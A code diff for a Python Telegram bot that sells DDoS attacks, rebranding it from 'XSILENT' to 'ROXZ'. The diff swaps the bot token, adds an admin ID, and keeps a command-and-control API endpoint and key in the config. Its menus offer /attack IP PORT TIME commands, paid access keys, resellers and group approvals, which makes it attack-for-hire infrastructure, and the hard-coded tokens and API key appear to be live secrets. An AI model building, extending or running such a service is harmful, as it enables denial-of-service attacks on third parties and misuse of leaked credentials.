@@ -13,8 +13,8 @@ from collections import defaultdict
 from pymongo import MongoClient
 
 # ========== CONFIG ==========
-BOT_TOKEN = "8615300823:AAE4ajz8ZN9W2ZYLrh1C8JXV1wrd5qzjXyw"
-ADMIN_ID = ["8487946379"]
+BOT_TOKEN = "7914185815:AAG_kgZVatEmQQcih3BrS1XoOUuw1m9_bLI"
+ADMIN_ID = ["8487946379", "7352008650"]
 API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
 API_KEY = "PFC10J"
 MAX_CONCURRENT = 2
@@ -238,18 +238,18 @@ def start(msg):
         group_id = str(msg.chat.id)
         attack_time = get_group_attack_time(group_id)
         if attack_time:
-            bot.reply_to(msg, "🔥 XSILENT DDOS BOT - GROUP\n\n✅ Group Approved!\n⚡ Attack Time: " + str(attack_time) + "s\n\n📝 COMMANDS:\n/attack IP PORT\n/help\n/start")
+            bot.reply_to(msg, "🔥 ROXZ DDOS BOT - GROUP\n\n✅ Group Approved!\n⚡ Attack Time: " + str(attack_time) + "s\n\n📝 COMMANDS:\n/attack IP PORT\n/help\n/start")
         else:
             bot.reply_to(msg, "❌ Group not approved! Contact owner to add this group.")
         return
     
     if uid in ADMIN_ID:
-        bot.reply_to(msg, "🔥 XSILENT DDOS BOT - OWNER\n\n✅ Full Access\n⚡ Total Concurrent: 2\n⏱️ Max Time: 300s\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/removekey KEY\n/add USER\n/remove USER\n/addreseller USER\n/removereseller USER\n/addgroup GROUP_ID TIME\n/removegroup GROUP_ID\n/broadcast MSG\n/stopattack IP:PORT\n/allusers\n/allgroups\n/api_status")
+        bot.reply_to(msg, "🔥 ROXZ DDOS BOT - OWNER\n\n✅ Full Access\n⚡ Total Concurrent: 2\n⏱️ Max Time: 300s\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/removekey KEY\n/add USER\n/remove USER\n/addreseller USER\n/removereseller USER\n/addgroup GROUP_ID TIME\n/removegroup GROUP_ID\n/broadcast MSG\n/stopattack IP:PORT\n/allusers\n/allgroups\n/api_status")
     elif uid in resellers:
-        bot.reply_to(msg, "🔥 XSILENT DDOS BOT - RESELLER\n\n✅ Reseller Access\n⚡ Total Concurrent: 2\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/mykeys")
+        bot.reply_to(msg, "🔥 ROXZ DDOS BOT - RESELLER\n\n✅ Reseller Access\n⚡ Total Concurrent: 2\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/mykeys")
     elif uid in users:
         has_active = check_user_expiry(uid)
-        bot.reply_to(msg, "🔥 XSILENT DDOS BOT - USER\n\n✅ Status: " + ("Active" if has_active else "Expired") + "\n⚡ Total Concurrent: 2\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/redeem KEY")
+        bot.reply_to(msg, "🔥 ROXZ DDOS BOT - USER\n\n✅ Status: " + ("Active" if has_active else "Expired") + "\n⚡ Total Concurrent: 2\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/redeem KEY")
     else:
         bot.reply_to(msg, "❌ Unauthorized! Use /redeem KEY")
 
@@ -888,6 +888,6 @@ def cleanup_attacks():
 cleanup_thread = threading.Thread(target=cleanup_attacks, daemon=True)
 cleanup_thread.start()
 
-print("XSILENT BOT STARTED - Owner: 8487946379")
+print("ROXZ BOT STARTED - Owner: 8487946379")
 
 bot.infinity_polling()     
